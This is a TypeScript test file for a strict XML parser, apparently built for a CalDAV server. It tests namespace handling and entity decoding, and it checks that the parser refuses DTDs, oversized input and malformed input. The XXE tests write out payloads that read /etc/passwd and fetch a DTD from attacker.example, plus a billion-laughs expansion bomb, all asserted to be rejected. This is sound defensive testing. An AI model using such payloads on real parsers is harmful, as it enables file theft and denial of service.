// The XML parser: what it keeps, and — the point of it — what it refuses (XXE, billion laughs, any
// DTD at all, undeclared prefixes, malformed input, oversized input).
import { describe, expect, it } from 'vitest';
import { NS, XmlError, childElement, childElements, parseXml, serializeXml, textContent, type XmlElement } from '../../src/index.js';

function code(f: () => unknown): string {
  try {
    f();
  } catch (err) {
    if (err instanceof XmlError) return err.code;
    throw err;
  }
  return 'accepted';
}

describe('parseXml — what it keeps', () => {
  it('resolves prefixes to namespace URIs, including the default namespace', () => {
    const root = parseXml(
      '<?xml version="1.0" encoding="UTF-8"?>\n<propfind xmlns="DAV:" xmlns:C="urn:ietf:params:xml:ns:caldav"><prop><getetag/><C:calendar-data/></prop></propfind>',
    );
    expect(root).toMatchObject({ ns: NS.DAV, local: 'propfind' });
    const prop = childElement(root, NS.DAV, 'prop');
    expect(prop && childElements(prop).map((e) => `{${e.ns}}${e.local}`)).toEqual([`{DAV:}getetag`, `{${NS.CALDAV}}calendar-data`]);
  });

  it('keeps an unprefixed attribute in no namespace, and undeclares the default with xmlns=""', () => {
    const root = parseXml('<a xmlns="urn:x" name="VEVENT"><b xmlns=""/></a>');
    expect(root.attrs).toEqual([{ ns: '', local: 'name', value: 'VEVENT' }]);
    expect((root.children[0] as XmlElement).ns).toBe('');
  });

  it('decodes the five predefined entities, character references and CDATA, and merges text', () => {
    const root = parseXml('<t>&lt;&gt;&amp;&quot;&apos; &#65;&#x42; <![CDATA[<raw & text>]]> end</t>');
    expect(root.children).toEqual(['<>&"\' AB <raw & text> end']);
  });

  it('normalises CRLF to LF but keeps a CR sent as &#13;', () => {
    expect(textContent(parseXml('<t>a\r\nb\rc&#13;&#10;d</t>'))).toBe('a\nb\nc\r\nd');
  });

  it('drops comments and processing instructions, and strips a UTF-8 BOM', () => {
    const bytes = Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from('<!-- hi --><?pi data?><a><!--x-->y<?q?></a><!-- after -->')]);
    expect(parseXml(bytes).children).toEqual(['y']);
  });

  it('round-trips a DAV response through the serializer', () => {
    const src = '<d:multistatus xmlns:d="DAV:"><d:response><d:href>/a%20b/</d:href><d:status>HTTP/1.1 200 OK</d:status></d:response></d:multistatus>';
    const tree = parseXml(src);
    expect(parseXml(serializeXml(tree))).toEqual(tree);
  });
});

describe('parseXml — XXE and entity expansion are impossible', () => {
  it('refuses the classic XXE (external entity to a file)', () => {
    const xxe = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><propfind xmlns="DAV:"><prop>&xxe;</prop></propfind>';
    expect(code(() => parseXml(xxe))).toBe('dtd');
  });

  it('refuses an external DTD subset and a parameter entity', () => {
    expect(code(() => parseXml('<!DOCTYPE a SYSTEM "http://attacker.example/evil.dtd"><a/>'))).toBe('dtd');
    expect(code(() => parseXml('<!DOCTYPE a [<!ENTITY % p SYSTEM "http://attacker.example/x">%p;]><a/>'))).toBe('dtd');
  });

  it('refuses billion laughs before expanding anything', () => {
    const lol =
      '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">' +
      Array.from({ length: 9 }, (_, i) => `<!ENTITY lol${String(i + 1)} "${`&lol${i === 0 ? '' : String(i)};`.repeat(10)}">`).join('') +
      ']><lolz>&lol9;</lolz>';
    const started = Date.now();
    expect(code(() => parseXml(lol))).toBe('dtd');
    expect(Date.now() - started).toBeLessThan(100);
  });

  it('refuses a markup declaration inside content, and any undefined entity', () => {
    expect(code(() => parseXml('<a><!ENTITY x "y"></a>'))).toBe('dtd');
    expect(code(() => parseXml('<a>&xxe;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a b="&xxe;"/>'))).toBe('entity');
    expect(code(() => parseXml('<a>&#0;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a>&#xD800;</a>'))).toBe('entity');
    expect(code(() => parseXml('<a>&amp</a>'))).toBe('entity');
  });
});

describe('parseXml — strictness', () => {
  it.each([
    ['<a>', 'syntax'],
    ['<a></b>', 'syntax'],
    ['<a/><b/>', 'syntax'],
    ['text<a/>', 'syntax'],
    ['', 'syntax'],
    ['<a b="1" b="2"/>', 'syntax'],
    ['<a b=1/>', 'syntax'],
    ['<a b="<"/>', 'syntax'],
    ['<a>]]></a>', 'syntax'],
    ['<a><!-- -- --></a>', 'syntax'],
    ['<a/><?xml version="1.0"?>', 'syntax'],
    ['<a>\u0001</a>', 'syntax'],
    ['<a>\uD800</a>', 'syntax'],
    ['<p:a/>', 'namespace'],
    ['<a p:b="1"/>', 'namespace'],
    ['<a xmlns:p=""/>', 'namespace'],
    ['<a xmlns:xml="urn:not-xml"/>', 'namespace'],
    ['<a xmlns:xmlns="urn:x"/>', 'namespace'],
    ['<a xmlns:p="urn:x" xmlns:q="urn:x" p:b="1" q:b="2"/>', 'namespace'],
    ['<?xml version="1.0" encoding="ISO-8859-1"?><a/>', 'encoding'],
  ])('refuses %j (%s)', (input, expected) => {
    expect(code(() => parseXml(input))).toBe(expected);
  });

  it('refuses malformed UTF-8 and UTF-16', () => {
    expect(code(() => parseXml(Buffer.from([0x3c, 0x61, 0x3e, 0xc3, 0x28, 0x3c, 0x2f, 0x61, 0x3e])))).toBe('encoding');
    expect(code(() => parseXml(Buffer.from('\uFEFF<a/>', 'utf16le')))).toBe('encoding');
  });

  it('enforces the size, depth, node and attribute limits', () => {
    expect(code(() => parseXml(`<a>${'x'.repeat(2000)}</a>`, { maxBytes: 1000 }))).toBe('limit');
    expect(code(() => parseXml(`${'<a>'.repeat(65)}${'</a>'.repeat(65)}`))).toBe('limit');
    expect(code(() => parseXml(`${'<a>'.repeat(64)}${'</a>'.repeat(64)}`))).toBe('accepted');
    expect(code(() => parseXml(`<a>${'<b/>'.repeat(20)}</a>`, { maxNodes: 10 }))).toBe('limit');
    expect(code(() => parseXml(`<a ${Array.from({ length: 70 }, (_, i) => `a${String(i)}="1"`).join(' ')}/>`))).toBe('limit');
  });

  it('parses a very deep document iteratively when the limit allows it', () => {
    const deep = `${'<a>'.repeat(20_000)}${'</a>'.repeat(20_000)}`;
    let node = parseXml(deep, { maxDepth: 30_000 });
    let depth = 1;
    while (node.children.length > 0) {
      node = node.children[0] as XmlElement;
      depth++;
    }
    expect(depth).toBe(20_000);
  });
});
